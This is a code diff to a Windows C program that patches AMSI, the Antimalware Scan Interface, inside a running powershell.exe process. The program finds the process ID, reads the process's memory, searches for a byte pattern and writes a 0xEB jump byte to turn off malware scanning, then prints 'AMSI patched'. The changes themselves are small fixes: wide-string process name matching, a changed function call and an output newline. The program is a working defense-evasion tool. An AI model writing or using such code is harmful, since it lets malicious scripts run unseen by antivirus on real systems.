@@ -14,7 +14,7 @@ char patch[] = { 0xEB };
 
 DWORD
 GetPID(
-	LPCSTR pn)
+	LPCWSTR pn)
 {
 	DWORD procId = 0;
 	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -30,7 +30,7 @@ GetPID(
 				Process32Next(hSnap, &pE);
 			do
 			{
-				if (!_stricmp(pE.szExeFile, pn))
+				if (!lstrcmpiW((LPCWSTR)pE.szExeFile, pn))
 				{
 					procId = pE.th32ProcessID;
 					break;
@@ -75,7 +75,7 @@ wmain() {
 
 	DWORD patternSize = sizeof(pattern);
 
-	DWORD tpid = GetPID("powershell.exe");
+	DWORD tpid = GetPID(L"powershell.exe");
 
 	if (!tpid)
 		return -1;
@@ -100,7 +100,7 @@ wmain() {
 
 	ReadProcessMemory(ProcessHandle, AmsiAddr, &buff, 1024, (SIZE_T*)NULL);
 
-	int matchAddress = searchPattern(buff, sizeof(buff), pattern, patternSize, (unsigned long long int)AmsiAddr);
+	int matchAddress = searchPattern(buff, sizeof(buff), pattern, patternSize);
 
 	unsigned long long int updateAmsiAdress = (unsigned long long int)AmsiAddr;
 
@@ -109,7 +109,7 @@ wmain() {
 	if (!WriteProcessMemory(ProcessHandle, (PVOID)updateAmsiAdress, patch, 1, 0))
 		return (-1);
 
-	printf("AMSI patched\n");
+	printf("\nAMSI patched\n");
 
 	system("pause");
 
